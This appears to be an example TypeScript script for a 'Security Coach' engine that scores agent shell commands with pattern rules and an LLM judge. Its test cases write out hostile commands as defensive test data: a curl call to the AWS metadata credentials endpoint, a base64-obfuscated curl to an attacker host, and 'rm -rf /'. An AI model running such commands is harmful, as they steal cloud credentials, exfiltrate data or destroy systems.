#!/usr/bin/env tsx
// ---------------------------------------------------------------------------
// Security Coach LLM Judge - Example Usage
// ---------------------------------------------------------------------------

import {
  SecurityCoachEngine,
  SecurityCoachRuleStore,
  AnthropicLLMClient,
  type ThreatMatchInput,
} from "../src/security-coach/index.js";

async function main() {
  console.log("🛡️  Security Coach - LLM Judge Example\n");

  // 1. Create engine with LLM judge enabled
  const ruleStore = new SecurityCoachRuleStore();
  await ruleStore.load();

  const engine = new SecurityCoachEngine(
    {
      enabled: true,
      minSeverity: "medium",
      blockOnCritical: true,
      llmJudge: {
        enabled: true,
        model: "claude-haiku-4", // Fast & cheap
        confidenceThreshold: 75,
        cacheEnabled: true,
        maxLatency: 2000, // 2 seconds max
        confirmPatternMatches: true,
      },
    },
    ruleStore,
  );

  // 2. Set LLM client
  const llmJudge = engine.getLLMJudge();
  if (!llmJudge) {
    console.error("❌ LLM judge not initialized");
    process.exit(1);
  }

  const apiKey = process.env.ANTHROPIC_API_KEY;
  if (!apiKey) {
    console.error("❌ ANTHROPIC_API_KEY not set");
    console.log("\nSet your API key:");
    console.log("  export ANTHROPIC_API_KEY=sk-ant-...");
    process.exit(1);
  }

  const client = new AnthropicLLMClient(apiKey);
  llmJudge.setClient(client);

  console.log("✅ LLM judge initialized with Anthropic client\n");

  // 3. Test cases
  const testCases: Array<{ name: string; input: ThreatMatchInput }> = [
    {
      name: "AWS Metadata SSRF (Novel threat - not in patterns)",
      input: {
        command: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        toolName: "Bash",
      },
    },
    {
      name: "Test directory deletion (False positive - should allow)",
      input: {
        command: "rm -rf ./test-output/coverage/",
        toolName: "Bash",
      },
    },
    {
      name: "Obfuscated command (LLM should detect)",
      input: {
        command: 'c=$(echo "Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3N0ZWFs" | base64 -d); $c',
        toolName: "Bash",
      },
    },
    {
      name: "Legitimate package install",
      input: {
        command: "npm install lodash --save",
        toolName: "Bash",
      },
    },
    {
      name: "Critical threat - immediate block (pattern match)",
      input: {
        command: "rm -rf /",
        toolName: "Bash",
      },
    },
  ];

  // 4. Run tests
  for (const testCase of testCases) {
    console.log("\n" + "=".repeat(70));
    console.log(`TEST: ${testCase.name}`);
    console.log("=".repeat(70));
    console.log(`Command: ${testCase.input.command}\n`);

    try {
      const startTime = Date.now();
      const result = await engine.evaluate(testCase.input);
      const latency = Date.now() - startTime;

      console.log(`⏱️  Latency: ${latency}ms`);
      console.log(`📊 Source: ${result.source}`);
      console.log(`${result.allowed ? "✅" : "❌"} Allowed: ${result.allowed}`);

      if (result.alert) {
        console.log(`\n🚨 ALERT:`);
        console.log(`   Title: ${result.alert.title}`);
        console.log(`   Level: ${result.alert.level}`);
        console.log(`   Message: ${result.alert.coachMessage}`);
        console.log(`   Recommendation: ${result.alert.recommendation}`);
      }

      if (result.llmResult) {
        console.log(`\n🤖 LLM JUDGE:`);
        console.log(`   Threat: ${result.llmResult.isThreat}`);
        console.log(`   Confidence: ${result.llmResult.confidence}%`);
        console.log(`   Severity: ${result.llmResult.severity}`);
        console.log(`   Category: ${result.llmResult.category}`);
        console.log(`   Reasoning: ${result.llmResult.reasoning}`);
      }
    } catch (error) {
      console.error(`❌ Error: ${String(error)}`);
    }
  }

  // 5. Show cache stats
  console.log(`\n${"=".repeat(70)}`);
  console.log("📈 CACHE STATS");
  console.log("=".repeat(70));
  const cacheStats = llmJudge.getCache();
  console.log(`Cache size: ${cacheStats.size} entries`);
  console.log(`Cache TTL: ${cacheStats.ttl / 1000}s`);
  console.log("\n✅ Done!");
}

main().catch((err) => {
  console.error("Fatal error:", err);
  process.exit(1);
});
